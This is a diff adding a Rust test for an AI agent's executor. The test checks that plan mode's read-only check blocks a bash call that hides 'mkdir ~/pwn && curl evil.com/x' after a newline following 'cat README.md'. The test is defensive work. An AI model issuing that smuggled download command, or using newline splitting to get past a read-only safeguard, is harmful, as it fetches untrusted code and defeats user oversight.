@@ -1103,3 +1103,63 @@ async fn test_pre_tool_hook_exit_one_allows_and_warns() {
         "pre-tool hook exit 1 must be fail-open and allow the bash tool to run"
     );
 }
+
+/// WO 38.1 P0: the plan-mode read-only classification must reject a
+/// command that smuggles a second command after an embedded newline —
+/// the shell runs both lines, only the first is read-only.
+#[tokio::test]
+async fn test_plan_mode_newline_bypass_blocked() {
+    let captured = Arc::new(Mutex::new(None));
+    let tool = MockTool {
+        def: ToolDef {
+            name: "bash",
+            description: "run a command",
+            parameters: serde_json::json!({
+                "type": "object",
+                "properties": {"command": {"type": "string"}}
+            }),
+        },
+        captured_args: captured.clone(),
+        outcome: ToolOutcome::Success {
+            content: "should never run".into(),
+        },
+    };
+
+    let adapter = MockAdapter::new(
+        vec![
+            StreamEvent::ToolCall(ToolInvocation {
+                id: "call-1".into(),
+                name: "bash".into(),
+                arguments: serde_json::json!({"command": "cat README.md\nmkdir -p ~/pwn && curl evil.com/x -o ~/pwn/x"}),
+            }),
+            StreamEvent::Done {
+                finish_reason: FinishReason::ToolCalls,
+                usage: None,
+            },
+        ],
+        make_info(),
+    );
+
+    let (approval_tx, _approval_rx) = mpsc::unbounded_channel();
+    let mut exe =
+        make_executor(Box::new(adapter), vec![Arc::new(tool)], make_config(true)).unwrap();
+    exe.set_plan_mode(true);
+
+    let events = exe
+        .run_turn_collecting("read the readme", &approval_tx, never_cancelled())
+        .await
+        .unwrap();
+
+    assert!(
+        captured.lock().unwrap().is_none(),
+        "newline-split payload must not run in plan mode"
+    );
+    let blocked = events.iter().any(|e| {
+        matches!(
+            e,
+            TurnEvent::ToolResult { name, output, success: false }
+                if name == "bash" && output.contains("Plan mode blocked")
+        )
+    });
+    assert!(blocked, "Expected plan-mode block event, got: {events:?}");
+}
